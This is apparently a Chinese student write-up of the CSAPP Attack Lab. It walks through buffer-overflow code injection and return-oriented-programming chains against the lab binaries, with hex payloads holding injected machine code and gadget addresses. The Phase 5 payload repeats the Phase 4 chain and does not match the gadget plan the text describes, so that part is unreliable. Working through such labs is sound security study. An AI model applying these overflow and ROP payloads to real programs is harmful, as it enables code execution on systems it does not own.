# **getbuf**

+ 分析代码得到栈帧布局

```plaintext
高地址
|---------------------|
| 上一栈帧的 ebp       |  ← 被覆盖风险
|---------------------|
| 返回地址 (retq)      |  ← 被覆盖风险
|---------------------|
| 40 字节缓冲区        |  ← Gets 函数写入位置
|                     |
|                     |
|---------------------|  ← rsp 栈顶
低地址
```

- **缓冲区溢出**：`Gets` 函数不检查输入长度，若输入超过 **40 字节**，会覆盖返回地址，导致程序跳转到攻击者指定的位置执行任意代码。
- 返回地址位于缓冲区后8 字节，因此需要构造：
  + 40 字节填充数据（覆盖缓冲区）。
  + 8 字节目标地址（覆盖返回地址）

# touch1

```cpp
00000000004017c0 <touch1>:
4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>  ; 打印成功信息
```

+ 就是只要执行这个函数即可通关，就是覆盖返回地址为touch1的地址

![屏幕截图 2025-06-11 171803](https://cdn.jsdelivr.net/gh/liyu6688/images@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-11%20171803.png)

# touch2

```cpp
4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi  ; 比较 edi 和0x202ce2(%rip)
```

+ 计算   %rip = 0x4017fc + 6 = 0x401802   0x401802 + 0x202ce2 = 0x6044e4
+ 就是要让edi和他相等

### 思路

+ 断点打到getbuff，查rsp得到getbuf的开始位置，
+ 然后修改代码给rdi赋值和跳转到touch2 指令，
+ 覆盖返回地址是getbuf的地址让他执行我修改的代码

### 过程和结果

![屏幕截图 2025-06-12 160628](https://cdn.jsdelivr.net/gh/liyu6688/images@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-12%20160628.png)

![屏幕截图 2025-06-12 145227](https://cdn.jsdelivr.net/gh/liyu6688/images@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-12%20145227.png)

![屏幕截图 2025-06-11 215640](https://cdn.jsdelivr.net/gh/liyu6688/images@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-11%20215640.png)

![屏幕截图 2025-06-11 215652](./../../c%E7%9B%98%E7%A7%BB%E8%BF%87%E6%9D%A5%E7%9A%84/%E5%9B%BE%E7%89%87/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-11%20215652.png)

# touch3

+ hexmatch(cookie,sval)==1后才能进入validate(3)
  而hexmatch函数的作用为将cookie转成字符串并和sval比较，如果相等则返回1，说明除了需进入touch3函数外，*sval必须等于cookie的字符串形式



+ 查看汇编代码

![屏幕截图 2025-06-12 164239](https://cdn.jsdelivr.net/gh/liyu6688/images@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-12%20164239.png)

+ %rsi（函数第二个参数）为char* sval，%edi为cookie，而877行将%rdi转入%rsi，说明初始状态下%rdi中存放着char* sval，即%rdi需要修改
  所以需要在buffer中注入代码，而为了运行注入的代码，同Phase 2 一样需要跳转回栈顶地址0x5561dc78



+ 注意到hexmatch函数中将%r12，%rbp，%rbx入栈，而这样会造成栈中原来输入的内容的覆盖，将数据放在getbuf的栈空间里面，很有可能就被这两个函数cover了。所以要把数据放到一个相对安全的栈空间里，选择放在父帧即test的栈空间里。gdb看一下test栈空间地址

  ![屏幕截图 2025-06-12 164625](https://cdn.jsdelivr.net/gh/liyu6688/images@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-12%20164625.png)

### 构造payload

![屏幕截图 2025-06-12 164754](https://cdn.jsdelivr.net/gh/liyu6688/images@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-12%20164754.png)

根据ASCII cookie是 35 39 62 39 39 37 66 61 00

+ ```
  48 c7 c7 a8 dc 61 55 68
  fa 18 40 00 c3 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  78 dc 61 55 00 00 00 00
  35 39 62 39 39 37 66 61
  00
  ```

![屏幕截图 2025-06-12 165153](https://cdn.jsdelivr.net/gh/liyu6688/images@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-12%20165153.png)

# Phase 4

在ROP攻击中设置了栈随机化，所以我们不能像前面三个一样定位到精确地址插入代码

+ 将cookie放到%rdi，把touch2的地址放到栈中，以ret执行
+ 猜测是需要一个mov命令来放参数，另外一个结合提示就是pop命令了，pop会把栈顶的cookie弹出到另外一个寄存器，再用mov命令写到%rdi里。
+ 查询farm可知pop %rax+ret可以用两种gadget表示
+ 而pop的内容（0x59b997fa）应该放在pop+retq指令之后，此时pop指令会将pop后对应位置的元素pop进对应的寄存器中
+ 而touch2函数地址（0x4017ec）应该放在movq+retq指令之后，当ret指令运行完毕后之后的地址会充当返回地址进入touch2函数

### 构造payload

![屏幕截图 2025-06-12 171508](https://cdn.jsdelivr.net/gh/liyu6688/images@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-12%20171508.png)

![屏幕截图 2025-06-24 122033](https://cdn.jsdelivr.net/gh/liyu6688/images@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-24%20122033.png)

# Phase 5

+ 该阶段要实现的效果和Phase 3一样，所以同样需要将%rdi内容修改为cookie字符串对应地址并跳到touch3函数

+ 由于每次栈都是随机开辟，存入字符串的地址并不固定，所以不能直接把地址赋值给%rdi，而需要通过读取栈顶地址%rsp加上一定的偏移量来获得字符串地址

+ movl指令以寄存器作为目的时，会把该寄存器的高位4字节设置为0，即会损失高四字节的值。而栈顶地址经过gdb断点测试，都至少大于0x7ffffff00000：

+ 所以ROP整体思路为：
  1.将偏移量pop入%rax中
  2.movl指令将偏移量以该顺序：%eax->%edx->%ecx->%esi移入%rsi中
  3.movq指令将栈指针以该顺序：%rsp->%rax->%rdi移入%rdi中
  4.lea指令计算字符串地址
  5.计算结果%rax赋值给%rdi
  6.调用touch3

+ 所以汇编

+ ```
  pop %rax
  retq
  movl 		%eax,%edx
  retq
  movl		%edx,%ecx
  retq
  movl 		%ecx,%esi
  retq
  movq 		%rsp,%rax
  retq
  movq 		%rax,%rdi
  retq
  lea 		(%rdi,%rsi,1),%rax
  retq
  movq		%rax,%rdi
  retq
  ```

+ 构造payload

  ```
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00	
  00 00 00 00 00 00 00 00
  cc 19 40 00 00 00 00 00
  fa 97 b9 59 00 00 00 00
  c5 19 40 00 00 00 00 00
  ec 17 40 00 00 00 00 00
  ```

  ![屏幕截图 2025-06-24 121647](https://cdn.jsdelivr.net/gh/liyu6688/images@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-24%20121647.png)

